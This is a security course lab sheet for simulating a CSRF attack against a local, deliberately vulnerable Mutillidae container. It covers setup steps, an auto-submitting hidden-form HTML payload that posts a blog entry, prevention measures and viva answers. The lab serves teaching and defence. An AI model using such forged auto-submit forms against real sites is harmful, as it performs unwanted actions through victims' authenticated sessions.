################################################################
# EXP 07 - Simulating CSRF (Cross-Site Request Forgery) Attacks
################################################################

----------------------------------------------------------------
WHAT THIS EXPERIMENT COVERS (say this if asked)
----------------------------------------------------------------
AIM: Simulate a CSRF attack in a controlled environment and understand how
an attacker makes an authenticated user's browser send an unintended request.

TOPIC / CONCEPTS:
- CSRF = tricking an authenticated user's browser into submitting an unwanted
  STATE-CHANGING request to an app where the user is logged in.
- Works because browsers AUTOMATICALLY attach session cookies to requests.
- A CSRF attack needs:
    1. Victim is authenticated to the target app
    2. App relies on auto-sent credentials (cookies)
    3. App lacks protection against forged requests
    4. Attacker can make the victim's browser submit a request
- CSRF token = a unique, unpredictable value tied to the user's session,
  sent in forms and verified server-side. Attacker can't guess it -> forged
  request is rejected.
- Prevention: anti-CSRF tokens, SameSite cookies, validate Origin/Referer,
  re-auth for sensitive actions, avoid GET for state changes.
- CSRF vs XSS: XSS runs script in the browser; CSRF abuses the user's existing
  authenticated session to perform an action.

----------------------------------------------------------------
SETUP (do this directly - works standalone)
----------------------------------------------------------------
sudo systemctl start docker
sudo docker run -d --name mutillidae -p 8081:80 citizenstig/nowasp
# if "name already in use":  sudo docker start mutillidae
sudo docker ps
# Open http://127.0.0.1:8081
#  - if "database offline" -> click "setup/reset the DB"
#  - Toggle Security until: Security Level 0 (Hosed)
#  - Register/login a test user (testuser / testpass)
# Launch Burp:  burpsuite -> Temporary Project -> Open Browser

----------------------------------------------------------------
STEPS
----------------------------------------------------------------
 1. Log in as testuser
 2. Capture a real "Add to blog" submit in Burp -> note the EXACT field names
    (Menu: A7 XSS -> Persistent -> Add to your blog)
 3. Create the attack file:

nano /root/csrf.html
   (if your prompt shows kali@kali -> use /home/kali/csrf.html instead)

 Paste (adjust action URL + field names to what you captured):

<html><body>
<form action="http://127.0.0.1:8081/index.php?page=add-to-your-blog.php" method="POST">
  <input type="hidden" name="blog_entry" value="CSRF test entry">
  <input type="hidden" name="add-to-your-blog-php-submit-button" value="Save Blog Entry">
</form>
<script>document.forms[0].submit();</script>
</body></html>

 Save: Ctrl+O, Enter, Ctrl+X

 4. While still logged in (same browser) open:
    file:///root/csrf.html        (or file:///home/kali/csrf.html)
 5. It auto-submits -> check View Blogs -> "CSRF test entry" appears = CSRF done
 6. Prevention: at Security Level >=1 Mutillidae uses a CSRF token,
    so the forged request is rejected (no valid token).

----------------------------------------------------------------
VIVA
----------------------------------------------------------------
Q: What is Cross-Site Request Forgery (CSRF)?
A: Tricking a logged-in user's browser into sending an unwanted state-changing request.
Q: How does a CSRF attack work?
A: The victim is authenticated; the browser auto-sends cookies, so a forged
   request from a malicious page is processed as if the user made it.
Q: Purpose of a CSRF token?
A: A secret unpredictable value the server verifies; attacker can't forge it.
